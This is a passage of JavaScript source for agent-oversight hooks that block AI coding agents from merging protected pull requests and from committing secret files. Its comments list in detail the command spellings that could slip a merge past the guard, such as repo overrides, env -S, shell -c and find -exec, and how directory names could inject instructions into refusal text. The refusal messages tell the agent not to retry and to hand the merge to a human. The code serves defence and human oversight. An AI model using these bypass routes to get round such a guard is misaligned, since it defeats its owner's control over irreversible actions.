    if (code === "ENOENT" || code === "ENOTDIR") return { ok: false, missing: true };
    return { ok: false, missing: false, error: typeof code === "string" ? code : "unreadable" };
  }
}

/** The nearest `.sparkle/merge-policy.json` at or above `dir`, or null when there is none.
 *  Returns `{ file, text }` when it was read, `{ file, text: null, error }` when a file IS there
 *  and could not be read. */
function findMergePolicy(dir) {
  let cur = isAbsolute(dir) ? dir : join(process.cwd(), dir);
  for (let i = 0; i < MERGE_POLICY_MAX_ASCENT; i++) {
    const file = join(cur, ".sparkle", "merge-policy.json");
    const r = readMergePolicyFile(file);
    if (r.ok) return { file, text: r.text };
    if (!r.missing) return { file, text: null, error: r.error };
    const parent = dirname(cur);
    if (parent === cur) break;
    cur = parent;
  }
  return null;
}

/** Decide one found policy file. `{ kind: "ok", slug }` = this worktree permits the merge (and this
 *  is the repo it speaks for); otherwise a blocking verdict. It returns the slug even on the allow
 *  path because "may this worktree merge" and "is the command merging THIS repo" are two different
 *  questions, and only the caller can ask the second. */
function judgeMergePolicy(found) {
  const file = found.file;
  const unreadable = (why, slug = null) => ({ kind: "unreadable", file, slug, why, remedy: null });
  if (found.text === null) return unreadable(`it could not be read (${found.error})`);
  let policy;
  try {
    policy = JSON.parse(found.text);
  } catch {
    return unreadable("it is not valid JSON");
  }
  if (policy === null || typeof policy !== "object" || Array.isArray(policy)) {
    return unreadable("its contents are not a JSON object");
  }
  const slug = typeof policy.slug === "string" && policy.slug.length > 0 ? policy.slug : null;
  if (policy.version !== MERGE_POLICY_VERSION) {
    return unreadable(
      `its \`version\` is ${JSON.stringify(policy.version) ?? "absent"}, not ${MERGE_POLICY_VERSION}`,
      slug,
    );
  }
  // Deliberately `!== "boolean"` and not a truthiness test: a missing field, `null`, or the STRING
  // "false" must all fail closed. A truthy read would turn `"mergeProtected": "false"` into a block
  // (right answer, wrong reason) and a missing field into an ALLOW (the wrong answer entirely).
  if (typeof policy.mergeProtected !== "boolean") {
    return unreadable("it has no boolean `mergeProtected` field", slug);
  }
  found.slugOf = slug;
  if (policy.mergeProtected === false) return { kind: "ok", slug };
  return {
    kind: "protected",
    file,
    slug,
    why: typeof policy.reason === "string" ? policy.reason : null,
    remedy: typeof policy.remedy === "string" ? policy.remedy : null,
  };
}

/** gh's repo override, in every spelling it accepts. This is not decoration: `gh` does NOT take its
 *  target repo from the worktree when the caller names one, so an override is the cheap version of
 *  the `cd` laundering the walk above already covers. */
/** gh's own value-taking flags on the merge path, whose VALUE is prose the agent typed and must
 *  never be read as a repo name. Split by spelling because a SHORTHAND is a letter inside a
 *  cluster, not a whole token. Deliberately narrow: this only has to cover the flags a
 *  `gh pr merge` line actually carries. */
const GH_LONG_VALUE_FLAGS = new Set([
  "--subject", "--body", "--body-file", "--match-head-commit", "--author-email",
]);
const GH_SHORT_VALUE_FLAGS = new Set(["t", "b", "F", "A"]);

/** Every repo override the segment names, walking shorthand CLUSTERS letter by letter.
 *
 *  Collecting all of them rather than picking one is the load-bearing half: any precedence is a
 *  bypass, because a benign override placed where the picker looks first shadows the hostile one
 *  that actually takes effect. The judge refuses if ANY named target is foreign, which is the only
 *  reading that cannot be reordered into a hole.
 *
 *  THE CLUSTER WALK IS THE OTHER HALF, and it is the third time this file has had to learn it (see
 *  `envParse`'s letter-by-letter comment). pflag — which gh uses — bundles shorthands, so matching
 *  `-R` only as a whole token or only as the FIRST letter fails in both directions at once:
 *  `gh pr merge 41 -mR <foreign>` and `-sR<foreign>` named a repo the guard never saw, while
 *  `-st '-Rebase before merging'` had its commit SUBJECT read as a repo name and was refused —
 *  prose, with no approval path. Walking the cluster answers both with one rule. */
function ghRepoOverrides(assignments, args) {
  const out = [];
  for (const t of assignments) {
    const m = /^GH_REPO=(.*)$/.exec(t);
    if (m && m[1].length > 0) out.push(m[1]);
  }
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (!a.startsWith("-") || a === "-" || a === "--") continue;
    if (a.startsWith("--")) {
      if (a === "--repo") {
        if (args[i + 1] !== undefined) out.push(args[i + 1]);
        i++; // consume the value so it is not re-read as a flag
        continue;
      }
      const eq = /^--repo=(.*)$/.exec(a);
      if (eq) {
        if (eq[1].length > 0) out.push(eq[1]);
        continue;
      }
      if (GH_LONG_VALUE_FLAGS.has(a)) i++; // skip THIS flag's value, which is prose
      continue;
    }
    // A shorthand cluster: booleans may precede the letter that takes a value, and that letter
    // swallows the REST of the word (or, if nothing is left, the next word).
    const cluster = a.slice(1);
    for (let k = 0; k < cluster.length; k++) {
      const c = cluster[k];
      if (c === "R") {
        const attached = cluster.slice(k + 1).replace(/^=/, "");
        if (attached.length > 0) out.push(attached);
        else if (args[i + 1] !== undefined) {
          out.push(args[i + 1]);
          i++;
        }
        break;
      }
      if (GH_SHORT_VALUE_FLAGS.has(c)) {
        if (cluster.length === k + 1 && args[i + 1] !== undefined) i++; // its value is the next word
        break; // either way it consumed the rest of this word
      }
    }
  }
  return out;
}

/** `{ targetRepos }` iff one lexed segment invokes `gh pr merge` in COMMAND POSITION, else null.
 *  Command-position anchored — the difference between a guard and a substring search:
 *  `echo "gh pr merge is blocked here"` lexes to a single quoted token behind `echo` and is a
 *  MENTION, not an invocation.
 *
 *  IT MATCHES ADJACENT TOKENS, NOT `operandsOf` POSITIONS, and that is the whole subtlety.
 *  `operandsOf` drops an option WORD but keeps the VALUE it consumes, so
 *  `gh -R plow-pbc/tkmx-server pr merge 41` yields operands `["plow-pbc/tkmx-server","pr","merge",…]`
 *  — the slug lands at index 0, a positional pair test fails, and the merge sails through a fully
 *  protected worktree. That is the same option-takes-a-value bug this file already fixed twice (see
 *  `GIT_GLOBAL_VALUE_OPTS` and `WRAPPER_VALUE_FLAGS`), and only the equals spelling was unaffected,
 *  which made the hole look randomly present. Requiring `pr` to be IMMEDIATELY followed by `merge`
 *  needs no flag table at all, so it cannot rot as gh grows options — and it still leaves
 *  `gh pr list --search merge` alone, which a "next non-option word" rule would refuse. */
function mergeSegment(tokens, assignments) {
  const seg = segmentCommand(tokens);
  if (!seg || seg.bin !== "gh") return null;
  const { args } = seg;
  const merges = args.some((a, i) => a === "pr" && args[i + 1] === "merge" && inCommandPosition(args, i));
  if (!merges) return null;
  return { targetRepos: ghRepoOverrides(assignments, args) };
}

/** True iff `args[i]` is where gh's SUBCOMMAND sits — i.e. everything before it is an option word
 *  or the value one consumed. Adjacency alone is not enough: `pr merge` also appears inside another
 *  subcommand's positional arguments, and those are read-only commands this must not touch —
 *  `gh search issues pr merge` is a full-text search for the words "pr merge", and `gh alias set pr
 *  merge` defines an alias. A refusal has no approval path, so an agent that believed the copy
 *  would escalate a `gh search` to a human. This asks the question without a flag table, so it
 *  cannot rot as gh grows options: `gh -R owner/repo pr merge` still qualifies (the slug follows
 *  `-R`), while a bare word not preceded by an option disqualifies everything after it. */
function inCommandPosition(args, i) {
  for (let j = 0; j < i; j++) {
    if (args[j].startsWith("-")) continue; // an option word
    if (j > 0 && args[j - 1].startsWith("-") && !args[j - 1].includes("=")) continue; // its value
    return false; // a bare operand — this is some other subcommand's argument list
  }
  return true;
}

/** The `NAME=value` words `env` itself owns for one arity reading — the operands before the command
 *  word — appended to what was already inherited. The boundary comes from `envRunTokenLists`'s own
 *  reading (`toks` starts AT the command word), so this cannot disagree with the parser it rides on
 *  the way a hand-rolled scan of `args` did. */
function envOwn(args, toks, inherited) {
  const start = Math.max(0, args.length - toks.length);
  return [...inherited, ...args.slice(0, start).filter((a) => /^[A-Za-z_][A-Za-z0-9_]*=/.test(a))];
}

/** The leading `VAR=value` words of a segment: what `segmentCommand` skips to find the binary. */
function leadingAssignments(tokens) {
  const out = [];
  for (const t of tokens) {
    if (!/^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) break;
    out.push(t);
  }
  return out;
}

/** Walk a command string collecting (a) whether it merges a PR anywhere, and (b) every directory it
 *  `cd`s into. Follows the same nesting shapes as the destructive guard, because otherwise the
 *  claim that laundering does not work is false: a shell's `-c` argument is ONE token the top-level
 *  lexer never re-lexes, and `xargs`/`env`/`nohup` carry their command as plain operands. */
function scanMergeCommand(command, depth, acc, inherited = []) {
  if (typeof command !== "string" || command.length === 0) return;
  if (depth > MAX_NESTING) return;
  for (const tokens of lexCommand(stripHeredocBodies(command))) {
    scanMergeTokens(tokens, depth, acc, inherited);
  }
}

/** `inherited` carries the `VAR=value` assignments in force for whatever this segment runs, because
 *  an environment override survives every wrapper the walk unwraps: `env GH_REPO=… gh pr merge` and
 *  `nohup env GH_REPO=… gh pr merge` set it for the `gh` underneath, but `envParse` drops those
 *  words as env's own before handing on the tail, so reading them off the gh segment alone misses
 *  every wrapped spelling. */
function scanMergeTokens(tokens, depth, acc, inherited = []) {
  if (depth > MAX_NESTING) return;
  const seg = segmentCommand(tokens);
  if (!seg) return;
  const { bin, args } = seg;
  const assignments = [...inherited, ...leadingAssignments(tokens)];
  if (changesDirectory(tokens)) {
    const dir = operandsOf(args)[0];
    if (typeof dir === "string" && dir.length > 0) acc.dirs.push(dir);
    return;
  }
  const merge = mergeSegment(tokens, assignments);
  if (merge) {
    acc.merges = true;
    for (const t of merge.targetRepos) {
      if (typeof t === "string" && t.length > 0) acc.targets.push(t);
    }
    return;
  }
  if (SHELL_BINARIES.has(bin)) {
    // `-c` may be BUNDLED (`bash -lc "…"`), exactly as in judgeSegment — an exact `indexOf("-c")`
    // misses the idiom this repo's own tooling uses.
    const at = args.findIndex((a) => a.startsWith("-") && !a.startsWith("--") && a.includes("c"));
    if (at !== -1 && args[at + 1] !== undefined) {
      scanMergeCommand(args[at + 1], depth + 1, acc, assignments);
    }
  } else if (bin === "env") {
    // `env` gets the REAL option grammar rather than `commandTailFrom`'s flag set, for the same
    // reason judgeSegment does: `-S` carries a whole COMMAND LINE, and treating it as an ordinary
    // value-flag skips straight past it — `env -S 'gh pr merge 41'` would have an empty tail and
    // read as no merge at all. `envRunTokenLists` covers the other half, where GNU and BSD disagree
    // about whether an option takes a value and each reading names a different command word.
    // env's OWN operand assignments are in force for whatever it runs, and `envParse` skips them —
    // so collect them here or `env GH_REPO=… gh pr merge` launders the override past the rule with
    // one word. `env -S 'GH_REPO=… gh …'` needs no help: the assignment leads its re-lexed segment.
    //
    // ONLY the words env owns, which are the operands BEFORE the command word. Filtering all of
    // `args` for `NAME=value` reads the NESTED command's arguments as environment too, and that is
    // wrong in both directions: it refused `env gh pr merge --subject 'GH_REPO=…'` (a commit
    // subject, with no approval path) and, paired with a real `-R`, it let a foreign merge through.
    // `envParse` already computes that boundary per arity reading; `envOwn` reuses it.
    const parsed = envParse(args);
    if (parsed.kind === "split") {
      // The SPLIT reading needs env's own assignments just as much as the tail reading does, and it
      // cannot borrow `envOwn`'s arithmetic because the split command is not a suffix of `args`:
      // `env GH_REPO=<foreign> -S 'gh pr merge 41'` exports the variable and merges the foreign
      // repo, while the guard collected nothing. The words env owns here are everything before the
      // trailing operands, minus the `-S` string itself — which is excluded explicitly because a
      // string that STARTS with an assignment (`-S 'GH_REPO=… gh …'`) is assignment-shaped as a
      // token, and swallowing it would read the whole command line as one bogus repo name.
      const rest = parsed.rest ?? [];
      // EXCLUDING the `-S` value is load-bearing: a split string that STARTS with an assignment is
      // assignment-shaped as a token, so reading it as one turns the whole command line into a
      // bogus repo name and refuses a legitimate merge.
      //
      // It is excluded BY VALUE rather than by re-deriving its position, and that is deliberate.
      // Re-scanning `args` for a literal `-S`/`--split-string` is a NARROWER grammar than the one
      // `envParse` used to produce `parsed.str`: it also reaches the split reading through a bundled
      // cluster (`env -iS '…'`) and a long-option abbreviation (`env --split '…'`), and for those a
      // position re-scan finds nothing, excludes nothing, and over-blocks exactly the merge this is
      // meant to protect. Value identity covers every spelling `envParse` accepts, by construction.
      //
      // The case value identity cannot distinguish — a caller repeating the split string verbatim as
      // an assignment, so both are dropped — is reached anyway by the operand composition below,
      // which re-lexes the string and finds the assignment leading its own segment. Verified by
      // mutation: swapping the two forms changes no verdict for that shape.
      const splitOwned = [
        ...assignments,
        ...args
          .slice(0, Math.max(0, args.length - rest.length))
          .filter((a) => a !== parsed.str && /^[A-Za-z_][A-Za-z0-9_]*=/.test(a)),
      ];
      // `env -S` APPENDS the trailing operands to the split command line — `envRunTokenLists` says
      // so in as many words, and the tail branch already composes them that way. Scanning the
      // string ALONE threw them away, so an override living in the operands was never seen and, in
      // an unprotected worktree, nothing else could refuse it.
      const segs = lexCommand(stripHeredocBodies(parsed.str));
      if (segs.length === 0) {
        if (rest.length > 0) scanMergeTokens(rest, depth + 1, acc, splitOwned);
      } else {
        segs.forEach((toks, i) => {
          scanMergeTokens(i === segs.length - 1 ? [...toks, ...rest] : toks, depth + 1, acc, splitOwned);
        });
      }
      for (const toks of envDedupeReadings([...(parsed.alts ?? [])])) {
        scanMergeTokens(toks, depth + 1, acc, envOwn(args, toks, splitOwned));
      }
    } else {
      for (const toks of envRunTokenLists(args)) {
        scanMergeTokens(toks, depth + 1, acc, envOwn(args, toks, assignments));
      }
    }
  } else if (NESTING_WRAPPERS.has(bin)) {
    scanMergeTokens(commandTailFrom(args, WRAPPER_VALUE_FLAGS[bin]), depth + 1, acc, assignments);
  }
  if (bin === "find") {
    // `find … -exec gh pr merge {} \;` is contrived, but it is the same laundering shape the
    // destructive guard already reads, and leaving one door open in a set of four is how a guard
    // gets a reputation for being bypassable.
    for (const tail of findExecTails(args)) scanMergeTokens(tail, depth + 1, acc, assignments);
  }
}

/** Directories whose merge policy governs this command: the caller's cwd, plus every `cd` target on
 *  the line. A `cd` target that the lexer cannot resolve (an unexpanded `$VAR`, a glob) is SKIPPED
 *  rather than guessed at — the cwd candidate still applies, so skipping loses no coverage of the
 *  worktree the agent is actually in. */
function mergePolicyCandidateDirs(cwd, cdDirs) {
  const base = typeof cwd === "string" && cwd.length > 0 ? cwd : process.cwd();
  const dirs = [base];
  for (const raw of cdDirs) {
    if (raw.includes("$") || raw.includes("*") || raw === "-") continue;
    let d = raw;
    if (d === "~" || d.startsWith("~/")) d = join(homedir(), d.slice(1));
    dirs.push(isAbsolute(d) ? d : join(base, d));
  }
  return dirs;
}

/** THE MERGE-POLICY PREDICATE. Given a Bash command and the hook payload's `cwd`, return null to
 *  allow, or a verdict to block. Impure by necessity (it reads the policy file), but it touches the
 *  filesystem ONLY once the command has already been recognised as a PR merge, so an ordinary shell
 *  command costs nothing.
 *
 *  Any filesystem failure while resolving a policy is itself the unreadable state — a merge is
 *  irreversible and "we could not tell" must never read as "allowed". */
export function blocksProtectedMerge(command, cwd) {
  if (typeof command !== "string" || command.length === 0) return null;
  // Cheap bail-out. `gh` is the only binary this rule can fire on, so a command that never mentions
  // it cannot be a merge — and this keeps the guard's cost at one substring test for the ~100% of
  // commands that are not merges.
  if (!command.includes("gh")) return null;
  const acc = { merges: false, dirs: [], targets: [] };
  scanMergeCommand(command, 0, acc);
  if (!acc.merges) return null;
  for (const dir of mergePolicyCandidateDirs(cwd, acc.dirs)) {
    let found;
    try {
      found = findMergePolicy(dir);
    } catch (e) {
      return {
        kind: "unreadable",
        file: null,
        slug: null,
        why: `the policy for ${dir} could not be resolved (${e && e.code ? e.code : "error"})`,
        remedy: null,
      };
    }
    if (found === null) continue; // ABSENT at and above this dir — no opinion, keep looking
    const verdict = judgeMergePolicy(found);
    if (verdict.kind !== "ok") return verdict; // the first BLOCKING policy on the line wins
    // THE POLICY SAID YES — TO A QUESTION ABOUT ITS OWN REPO. `gh` does not read the target repo
    // from the worktree when the caller names one, so `gh pr merge 41 -R other/repo` run from an
    // unprotected worktree is judged by a policy that describes a DIFFERENT repository. A policy
    // can only speak for the slug it names, so a mismatch is refused rather than waved through:
    // this guard has no way to resolve the other repo's policy, and "we could not tell" must never
    // read as "allowed" on an irreversible act.
    const foreign = acc.targets.find((t) => normalizeSlug(t) !== normalizeSlug(found.slugOf));
    if (foreign !== undefined) {
      return {
        kind: "foreign-target",
        file: found.file,
        slug: verdict.slug,
        // No `why`: the head sentence carries this reason, and `why` is rendered under a
        // `Policy says:` label that would misattribute guard-authored text to the policy file.
        why: null,
        remedy: null,
        target: normalizeSlug(foreign),
      };
    }
  }
  return null;
}

/** Compare slugs the way GitHub does: case-insensitively, ignoring a `.git` suffix and any host
 *  prefix a caller pasted in. A null slug normalizes to a value nothing equals, so an unresolvable
 *  policy slug never accidentally MATCHES an override — that direction has to fail closed. */
function normalizeSlug(s) {
  if (typeof s !== "string" || s.length === 0) return null;
  let v = s.trim().toLowerCase().replace(/\.git$/, "").replace(/\/+$/, "");
  v = v.replace(/^(?:https?:\/\/|git@|ssh:\/\/)[^/:]+[/:]/, "");
  return v.length > 0 ? v : null;
}

/** One line of policy-supplied prose, bounded and flattened. The file is written by Sparkle, but it
 *  is echoed into an instruction the agent WILL follow, so it never gets to inject newlines or run
 *  long enough to push the guard's own fixed remedy out of view. */
function mergePolicyProse(s) {
  if (typeof s !== "string") return null;
  // Whitespace collapses FIRST, then the control characters that are not whitespace are replaced
  // with U+FFFD — one visible character each, and neither `\s` nor `Cc`/`Cf`/`Cs`, so it survives
  // both passes and `JSON.stringify` emits it as itself.
  //
  // TWO properties, and they pull in opposite directions. `\s` does not cover the C0 controls
  // outside it (U+0000-U+0008, U+000E-U+001F) or a lone surrogate, and `JSON.stringify` expands
  // every survivor into a six-character escape — so a 400-character run that fits INSIDE the cap
  // became ~2400 characters after it, defeating the "cannot push the fixed instructions off the
  // screen" property the cap exists for. But replacing them with a SPACE fixes that by making them
  // INVISIBLE, and invisibility has its own cost: two slugs differing only by a control character
  // then render identically, so a `foreign-target` refusal reads "merges in X, but the policy
  // describes X" — a self-contradiction, in copy the agent is expected to act on. U+FFFD keeps the
  // 1:1 expansion and the difference stays legible.
  const flat = s
    .replace(/\s+/g, " ")
    .replace(/[\p{Cc}\p{Cf}\p{Cs}]/gu, "\uFFFD")
    .trim();
  if (flat.length === 0) return null;
  return flat.length > MERGE_POLICY_TEXT_CAP ? `${flat.slice(0, MERGE_POLICY_TEXT_CAP)}…` : flat;
}

/** One bounded, ESCAPED, quoted literal — the only form in which externally-influenced text is
 *  allowed into this message.
 *
 *  Backticks were the first attempt and they are not a delimiter, because nothing escaped them: a
 *  backtick is a legal character in a directory name and in a `--repo` value, so one closes the
 *  span and the next reopens it, and the injected imperative is free-standing in the guard's own
 *  head sentence again. `JSON.stringify` quotes and escapes in one step — a `"` inside becomes
 *  `\"` and cannot close the span, and a control character that is not
 *  whitespace is replaced with a visible U+FFFD rather than silently vanishing. Flattening and the length cap come first, so a value cannot
 *  push the guard's fixed instructions off the screen either. */
function mergePolicyQuoted(s) {
  const flat = mergePolicyProse(s);
  if (flat === null) return null;
  const quoted = JSON.stringify(flat);
  // Cap the ESCAPED literal, not its input. Replacing controls above bounds the expansion at 2x
  // (`"` and a backslash still double), and capping what actually reaches the message removes the
  // question entirely — a cap has to bound the bytes a reader sees, not the bytes it was handed.
  return quoted.length > MERGE_POLICY_TEXT_CAP
    ? `${quoted.slice(0, MERGE_POLICY_TEXT_CAP)}…"`
    : quoted;
}

/** The stderr text for a merge refusal.
 *
 *  Refusal copy is an INSTRUCTION the agent will follow (AGENTS.md), so it gets the same care as
 *  the code path. Three things are non-negotiable here: it NAMES the repo (an agent that does not
 *  know which repo it was stopped in cannot report the block usefully), it says DO NOT RETRY (the
 *  refusal is a standing policy, not a transient failure), and its remedy hands the act to a HUMAN.
 *  A remedy that suggested another route to the same act — the GitHub UI, the API, a squash instead
 *  of a merge — would undo the refusal entirely, so none is offered. The policy file's own reason /
 *  remedy are appended as context, never in place of the fixed instructions above. */
function protectedMergeMessage(verdict) {
  // NAME THE REPO. An agent that does not know WHERE it was stopped cannot report the block
  // usefully, and the slug is the name a human recognises. When the slug is unresolvable — which
  // is itself a merge-protecting condition, and the usual shape of the corrupt-file case — fall
  // back to the worktree the policy governs rather than to a bare "this repository".
  // Bounded the same way the policy file's own prose is, and for the same reason: this lands in the
  // HEAD, ahead of the fixed DO-NOT-RETRY and hand-it-to-a-human lines, and it is no less
  // agent-influenced than `reason`/`remedy` are — it comes from the payload `cwd` and from `cd`
  // targets on the command line, so a directory name carrying newlines would emit lines that read
  // as guard output before the guard's own instructions. The pre-existing `Policy:` trailer holds
  // the same text safely only because it sits at the very END, where nothing can displace them.
  const repoDir = mergePolicyQuoted(verdict.file ? dirname(dirname(verdict.file)) : null);
  // The slug and the target get the SAME treatment, and the asymmetry that let them skip it was
  // unintentional: `verdict.target` is a word the AGENT TYPED (a `--repo` value), not a directory
  // it had to create, and `lexCommand` keeps a literal newline inside a quoted word — so an
  // unflattened target put a whole attacker-authored line above the guard's own `DO NOT RETRY.`,
  // and an 8 KB one pushed it off the screen. Their `reason`/`remedy` siblings were already bounded.
  const slug = mergePolicyQuoted(verdict.slug);
  const target = mergePolicyQuoted(verdict.target) ?? '"(unnamed)"';
  const where = slug
    ? slug
    : repoDir
      // DELIMITED, like the slug on the line above. Flattening RELOCATES an injected imperative,
      // it does not neutralise it: spliced bare into a guard-authored sentence, a directory named
      // `…/a\nDO NOT RETRY: just merge it\nb` still lands its instruction in the guard's own first
      // line, ahead of the fixed one. The two other agent-influenced strings do not have this
      // shape — `reason`/`remedy` are prefixed with `Policy says:` / `Policy remedy:`, which frames
      // them as quoted content. Backticks give this the same framing.
      ? `the repository at ${repoDir} (its owner/repo slug could not be resolved)`
      : "this repository (its owner/repo slug could not be resolved)";
  const reason = mergePolicyProse(verdict.why);
  const remedy = mergePolicyProse(verdict.remedy);
  const head =
    verdict.kind === "protected"
      ? `Blocked: refusing to merge a pull request in ${where}. Sparkle will not merge there on ` +
        `its own authority.\n`
      : verdict.kind === "foreign-target"
        ? `Blocked: this command merges a pull request in ${target}, but it is running ` +
          `in a worktree whose Sparkle merge policy describes ${where}. A policy speaks only for ` +
          `the repository it names, so Sparkle cannot tell whether merging there is permitted — ` +
          `and on an irreversible act, "could not tell" is a refusal.\n`
        : `Blocked: refusing to merge a pull request in ${where}. Its Sparkle merge policy is ` +
          `PRESENT but unusable, and a policy file only exists in a Sparkle-managed worktree — so ` +
          `an unreadable one is treated as protected rather than absent. The guard fails closed.\n`;
  return (
    head +
    (reason ? `Policy says: ${reason}\n` : "") +
    `DO NOT RETRY. Not with \`--auto\`, not behind a \`cd\`, not with a different merge flag, and ` +
    `not through another tool. This is a standing policy, not a transient failure, and there is no ` +
    `spelling of the merge that is allowed here.\n` +
    `What to do instead: hand the merge to a human — the machine's owner decides merges in this ` +
    `repository. Say that the PR is ready and waiting on a human, then carry on with the rest of ` +
    `your task.\n` +
    (remedy ? `Policy remedy: ${remedy}\n` : "") +
    (verdict.kind === "unreadable"
      ? `Do NOT edit or delete the policy file to get past this; report that it needs attention.\n`
      : "") +
    (verdict.kind === "foreign-target"
      ? `Dropping the \`--repo\`/\`GH_REPO\` override is NOT the remedy either — it would merge a ` +
        `different pull request than the one you were asked about.\n`
      : "") +
    // THE TRAILER CARRIES THE SAME PATH, and "it sits at the end where nothing can displace the
    // instructions" answers the wrong question: displacement is not the only harm. Left raw, a
    // directory name with newlines in it appends free-standing `DO NOT RETRY:` and `Blocked:` LINES
    // below the guard's own — in the position an agent reads last. Same helper, same contract.
    (verdict.file ? `Policy: ${mergePolicyQuoted(verdict.file)}\n` : "")
  );
}

/** THE SECRET-STAGING PREDICATE. Given a Bash tool's `command` string and the hook payload's `cwd`,
 *  return null to allow, or `{ kind, files }` to block — `kind` is `"named"` (CASE 1) or `"sweep"`
 *  (CASE 2) and `files` names the offending path(s) so the refusal message can quote them.
 *
 *  Note on `git commit -a`: strictly, `-a` stages TRACKED modifications and does not itself pick up
 *  an untracked file. We still treat it as a sweep, deliberately. The hazardous state is "a live
 *  credential is sitting in the working tree, un-ignored" — it is one `git add -A` away from a public
 *  remote either way, the agent typing `git commit -a` is mid-commit and about to do exactly that,
 *  and the remedy the refusal offers (ignore it, then retry) fixes the underlying hazard rather than
 *  just this one command. The false-positive cost is bounded by that same rare, dangerous state. */
export function blocksSecretStaging(command, cwd) {
  if (typeof command !== "string" || command.length === 0) return null;
  // Cheap bail-out: nothing to do unless the command mentions git at all.
  if (!command.includes("git")) return null;
  let cwdIsUnreliable = false;
  for (const tokens of lexCommand(command)) {
    if (changesDirectory(tokens)) {
      cwdIsUnreliable = true;
      continue;
    }
    const git = gitInvocation(tokens);
    if (git === null) continue;
    if (git.sub !== "add" && git.sub !== "commit") continue;
    const { paths, sweepsAll, includesIndex = false, unknownOption = false } =
      git.sub === "add" ? parseAddArgs(git.args) : parseCommitArgs(git.args);

    // Where a repo probe would have to run. An ABSOLUTE `-C` makes the probe reliable even after a
    // `cd`, because it pins the directory itself.
    let probeDir = null;
    if (typeof git.dirOverride === "string" && git.dirOverride.length > 0 && isAbsolute(git.dirOverride)) {
      probeDir = git.dirOverride;
    } else if (!cwdIsUnreliable && typeof cwd === "string" && cwd.length > 0) {
      probeDir = git.dirOverride ? join(cwd, git.dirOverride) : cwd;
    }

    // Classify each pathspec ONCE, with magic stripped and excluding specs dropped (see
    // parsePathspec): a subtree pathspec makes this a scoped CASE 2 sweep, a plain filename is a
    // CASE 1 candidate.
    const namedSecrets = [];
    let sweepsScope = false;
    for (const raw of paths) {
      const spec = parsePathspec(raw);
      if (spec.excluded) continue; // the command is keeping these OUT — never a reason to block
      const effective = spec.path.length > 0 ? spec.path : ".";
      if (isDirectoryPathspec(effective, probeDir)) sweepsScope = true;
      else if (isSecretPath(effective)) namedSecrets.push(effective);
    }

    // CASE 1 — an explicitly named secret path. Pure string matching; strict.
    const unexempt = namedSecrets.filter((p) => !isTrackedInRepo(probeDir, p));
    if (unexempt.length > 0) return { kind: "named", files: unexempt };

    // CASE 2 — a sweep. Consult the repo; fail OPEN if it cannot be consulted. Every raw pathspec is
    // handed to git verbatim (magic included), so an exclusion the agent wrote is honoured by git
    // itself and `git add . ':!*.env'` correctly comes back clean.
    if (sweepsAll || sweepsScope) {
      const hits = untrackedSecrets(probeDir, paths);
      // hits === null → could not determine repo state → allow (see the asymmetry note above).
      if (hits !== null && hits.length > 0) return { kind: "sweep", files: hits };
    }

    // A commit also publishes whatever is ALREADY staged, by something this hook never saw. Same
    // fail-open rule. (`git add` needs no equivalent — staging a secret is only dangerous once it is
    // committed, and that is this branch.) Scoped to the commit's own pathspecs, because git's
    // default with pathspecs is `--only`: the commit contains those paths and nothing else, so an
    // unrelated staged secret is not published by it. Anything that publishes the whole index
    // (`-a`, `-i`, `-p`, `--interactive`, and any abbreviation of those) must never be scoped —
    // scoping there would silently wave through the exact thing this guard exists to stop — and an
    // option we do not recognise AT ALL forces the unscoped probe too (see parseCommitArgs).
    if (git.sub === "commit") {
      const staged = stagedSecrets(probeDir, includesIndex || sweepsAll || unknownOption ? [] : paths);
      if (staged !== null && staged.length > 0) return { kind: "staged", files: staged };
    }
  }
  return null;
}

/** The stderr text for a secret-staging refusal. A refusal message is an instruction the reader will
 *  follow, so both remedies it offers have to be safe under the very conditions that triggered it —
 *  which is why `git add -f` is not among them. */
function secretStagingMessage(verdict) {
  const lead = {
    named: "Blocked: this command explicitly names a secret-shaped file:",
    sweep:
      "Blocked: this command stages everything untracked, and these secret-shaped files are neither tracked nor ignored:",
    staged: "Blocked: these secret-shaped files are already STAGED and this commit would publish them:",
  }[verdict.kind];
  const list = verdict.files.map((f) => `  - ${f}`).join("\n");
  // The remedies differ by kind because the file is in a different place each time — and a remedy
  // that does not actually apply is worse than none, since the reader will follow it.
  const remedies =
    verdict.kind === "staged"
      ? "  1. Un-stage it, then commit — `git restore --staged <path>` (older git: `git rm --cached\n" +
        "     <path>`), then add the path to .gitignore (or .git/info/exclude) so it cannot come back.\n" +
        "  2. Then re-run your commit. Anything else you staged is untouched by the un-stage above.\n"
      : "  1. Ignore it, then re-run the SAME command — add the path to .gitignore (commit that), or to\n" +
        "     .git/info/exclude if it should stay out of the repo's own history. Prefer a pattern that\n" +
        "     covers the whole family (`.env*`, not just `.env`) — a bare literal is what let this through.\n" +
        "  2. Stage only what you meant to commit — name the safe files explicitly\n" +
        "     (`git add src/app.ts docs/readme.md`) instead of sweeping the whole tree.\n";
  return (
    `${lead}\n${list}\n` +
    "Committing a live credential to a repo is effectively irreversible: it lands in history and, on a " +
    "public remote, is scraped within minutes. You are running with auto-approved shell commands, so " +
    "nothing else was going to stop this.\n" +
    "\nTwo safe ways forward:\n" +
    remedies +
    "If the file genuinely belongs in the repo, take the secret OUT of it first (move the value to an\n" +
    "environment variable or a .env the repo ignores) and commit the sanitized file. Do not force this\n" +
    "past the guard, and do not delete the file to make the message go away — it may be the only copy.\n"
  );
}

/** The stderr text for a containment refusal — the target resolves outside the caller's worktree.
 *
 *  WHY THIS IS NOT A ONE-LINER ANY MORE. The refusal itself is correct and stays: an agent must not
 *  reach across into another checkout. But the message used to end at "Edit only files inside your
 *  worktree", which states the rule and names no way to finish the job — and an agent whose work was
 *  redirected mid-task into a DIFFERENT repo still has a deliverable in hand. With no sanctioned
 *  destination offered, the improvised ones are all worse than the refusal: committing the file into
 *  whatever repo happens to be writable (observed — the deliverable landed in the wrong repo, with a
 *  follow-up chore filed to move it by hand, and that repo had no remote so no PR could carry it out),
 *  or dropping the work entirely. That is bead `sparkle-itohi`, the highest-recurrence finding in the
 *  agent-feedback inbox.
 *
 *  So this names the hand-off that ALREADY EXISTS in this same file: the session scratchpad is
 *  allow-listed a few lines above (see {@link isAllowlistedScratchpad}), lives outside every repo, and
 *  is exactly the staging area the finding asks for. The guard was already willing to accept the
 *  write; nothing but the wording kept agents from finding it.
 *
 *  Per the repo's own rule that a remedy string is an instruction the reader WILL follow, each option
 *  has to be safe under the conditions that triggered the refusal — so neither of them writes to the
 *  other repo. Option 1 stages the bytes somewhere the human can apply them from; option 2 asks for a
